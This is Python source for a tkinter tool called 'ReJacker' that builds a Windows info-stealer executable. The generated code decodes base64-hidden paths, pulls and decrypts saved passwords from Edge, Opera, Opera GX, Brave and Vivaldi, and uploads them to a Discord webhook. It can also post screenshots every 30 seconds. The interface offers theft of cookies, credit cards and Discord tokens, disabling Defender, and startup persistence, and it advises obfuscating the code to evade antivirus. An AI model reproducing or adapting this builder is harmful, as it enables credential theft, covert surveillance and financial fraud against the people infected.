        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {edge_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass


try:
    {opera_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass

try:
    {passwords_variable_name} += "\\nOpera\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxEZWZhdWx0XExvZ2luIERhdGE=").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {opera_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass


try:
    {operagx_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxMb2NhbCBTdGF0ZQ==").decode())
except:
    pass

try:
    {passwords_variable_name} += "\\nOpera Gx\\n"
    for row in sqlite3.connect(os.getenv("APPDATA") + base64.b64decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZVxMb2dpbiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {operagx_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass


try:
    {brave_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcTG9jYWwgU3RhdGU=").decode())
except:
    pass

try:
    {passwords_variable_name} += "\\nBrave\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {brave_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass


try:
    {vivaldi_deckey_var_name} = {encrypted_key_get_fuction_name_var}(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXExvY2FsIFN0YXRl").decode())
except:
    pass

try:
    {passwords_variable_name} += "\\nVivaldi\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {vivaldi_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass
    
try:
    {passwords_variable_name} += "\\nVivaldi P1\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMVxMb2dpbiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {vivaldi_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass
    
try:
    {passwords_variable_name} += "\\nVivaldi P2\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgMlxMb2dpbiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {vivaldi_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass
    
try:
    {passwords_variable_name} += "\\nVivaldi P3\\n"
    for row in sqlite3.connect(os.getenv("LOCALAPPDATA") + base64.b64decode("XFZpdmFsZGlcVXNlciBEYXRhXFByb2ZpbGUgM1xMb2dpbiBEYXRh").decode()).cursor().execute(base64.b64decode("U0VMRUNUICogRlJPTSBsb2dpbnM=").decode()):
        {passwords_variable_name} += "\\n URL:" + str(row[0]) + " , " + str(row[2]) + " Username/Email: " + str(row[3]) + " Password: " + {encrypted_use_decrypt_data_fuction_name_var}(row[5], {vivaldi_deckey_var_name}) + " , " + str(row[7]) + "\\n"
except:
    pass
    

encoder = MultipartEncoder(''' + '''{'payload_json': json.dumps({
    "username": base64.b64decode("UmVqYWNrZXI=").decode(),
    "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode()
}), 'file': (f'scxvsdgfgczw.txt',''' + passwords_variable_name + ''', 'application/txt')})
requests.post(''' + webhooklink_var_name +''', headers={'Content-type': encoder.content_type}, data=encoder)
    
'''



    if (oto_30sec_screenshot.get() == 1):
        app_source_code_str += f''' 

from PIL import ImageGrab
import os
import io
import base64
import

while True:
    image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
            )

    image_buffer = io.BytesIO()
    image.save(image_buffer, format="PNG")
    image_data = image_buffer.getvalue()
    image_buffer.close()
    image.close()

    encoder = MultipartEncoder(''' + '''{'payload_json': json.dumps({
                    "username": base64.b64decode("UmVqYWNrZXI=").decode(),
                    "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JlbG94ZS9SZUphY2tlci9tYWluL3JlY2pha2VyLnBuZw==").decode(),
                    "embeds": [
                        {
                            "color": 16754176,
                            "title": base64.b64decode("U2NyZWVuc2hvdCAtIFJlSmFja2Vy").decode(),
                            "image": {
                                "url": "attachment://image.png"
                            }
                        }
                    ]
                }), 'file': ('image.png', image_data, 'image/png')})
    requests.post(''' + webhooklink_var_name + ''', headers={'Content-type': encoder.content_type}, data=encoder)
    time.sleep(30)

'''

    virus_open.writelines(app_source_code_str)
    virus_open.close()
    global appiconlocation
    result = subprocess.run(["python", "-m", "PyInstaller",
                                "--onefile", "--clean", "--noconsole",
                                "--hidden-import", "base64",
                                "--hidden-import", "requests",
                                "--hidden-import", "json",
                                "--hidden-import", "subprocess",
                                "--hidden-import", "time",
                                "--hidden-import", "io",
                                "--hidden-import", "requests_toolbelt",
                                "--hidden-import", "pillow",
                                "--hidden-import", "PIL",
                                "--hidden-import", "PIL.ImageGrab",
                                "--hidden-import", "PIL.Image",
                                "--hidden-import", "os",
                                "--hidden-import", "shutil",
                                "--hidden-import", "sqlite3",
                                "--hidden-import", "sys",
                                "--hidden-import", "pycryptodomex",
                                "--hidden-import", "cryptography",
                                "--hidden-import", "Cryptodome",
                                "--hidden-import", "Cryptodome.Cipher",
                                "--hidden-import", "Cryptodome.Cipher.AES",
                                "--hidden-import", "win32crypt",
                                "--icon", appiconlocation, f"./generated_app.py"])
    
    print(result.stdout)
    print(result.stderr)
    shutil.move('dist/generated_app.exe', 'generated_app.exe')
    shutil.rmtree("dist")
    shutil.rmtree("build")
    os.remove("generated_app.spec")
    tkinter.messagebox.showinfo("Success", "Succesfull Generated Virus \nLook my folder :D \nDont Forget ! Rename File Name \n The source code is available in the generated_virus file. To avoid being caught by antivirus software, hide that code with tools such as 'python obfuscator' and convert it to exe.")
    
    pass

mainwindow = tkinter.Tk()
mainwindow.iconbitmap("src_files/app_icon.ico")
mainwindow.title("ReJacker - Windows Confidential İnformant")
mainwindow.geometry("830x510")
mainwindow.resizable(False, False)

systeminfos = tkinter.IntVar()
disabledefender = tkinter.IntVar()
single_screenshot = tkinter.IntVar()
oto_30sec_screenshot = tkinter.IntVar()
copy_start_up_folder = tkinter.IntVar()
discordinfos = tkinter.IntVar()
downloadfiles = tkinter.IntVar()

get_browser_history = tkinter.IntVar()
get_browser_cookies = tkinter.IntVar()
get_browser_credit_cards = tkinter.IntVar()
get_browser_passwords = tkinter.IntVar()

# User intarface
tkinter.Label(bg="white", width=20, text="Discord Webhook URL ->").place(x=1, y=10)
webhooktext = tkinter.Text(height=1, width=65 ,font="regular")
webhooktext.place(x=145, y=10)


tkinter.Checkbutton(text='System İnfos (System, ip, os ver. , ...)', variable=systeminfos, onvalue=1, offvalue=0).place(x=5, y=50)

tkinter.Checkbutton(text='Disable Defender (Only Administrator Run) [This feature is dangerous and may cause it to be caught by antiviruses.]', variable=disabledefender, onvalue=1, offvalue=0).place(x=5, y=90)

tkinter.Checkbutton(text='Single screenshot (When it is run, it is taken once and thrown away)', variable=single_screenshot, onvalue=1, offvalue=0).place(x=5, y=110)

tkinter.Checkbutton(text='Auto screenshot every 30 seconds', variable=oto_30sec_screenshot, onvalue=1, offvalue=0).place(x=5, y=130)

tkinter.Checkbutton(text='Copy Startup Folder (Click this to have the virus run when the system starts.) [This feature is dangerous and may cause it to be caught by antiviruses.]', variable=copy_start_up_folder, onvalue=1, offvalue=0).place(x=5, y=150)

tkinter.Checkbutton(text='Discord İnfos (Token, mail, ...)', variable=discordinfos, onvalue=1, offvalue=0).place(x=5, y=70)


tkinter.Label(bg="white", width=114, text="Browsers Data | Browsers:(Chrome, Opera GX, Opera, Brave, Vivaldi) [This features is dangerous and may cause it to be caught by antiviruses.]").place(x=20, y=171)

tkinter.Checkbutton(text='Get Browser History ', variable=get_browser_history, onvalue=1, offvalue=0).place(x=18, y=190)

tkinter.Checkbutton(text='Get Browser Cookies ', variable=get_browser_cookies, onvalue=1, offvalue=0).place(x=18, y=210)

tkinter.Checkbutton(text='Get Browser Credit Cards ', variable=get_browser_credit_cards, onvalue=1, offvalue=0).place(x=18, y=230)

tkinter.Checkbutton(text='Get Browser Passwords ', variable=get_browser_passwords, onvalue=1, offvalue=0).place(x=18, y=250) 


tkinter.Checkbutton(text='Download Files (Names)', variable=downloadfiles, onvalue=1, offvalue=0).place(x=5, y=280)



tkinter.Label(bg="white", width=85, text="Turn ON ONLY the FEATURES YOU REALLY NEED so that antivirus software cannot detect them!").place(x=5, y=353)

tkinter.Label(bg="white", width=110, text="After the software is created, if there are any problems with antiviruses, you will find the source code in the generated_app.py file in the folder. \nYou can hide this source code with tools like python-obfuscator and fix your antivirus detection problem.").place(x=5, y=377)


tkinter.Button(text ="Select the application icon", command = appiconpic).place(x=15, y=420)

tkinter.Button(text ="Build Virus", command = build_virus).place(x=15, y=455)

mainwindow.mainloop()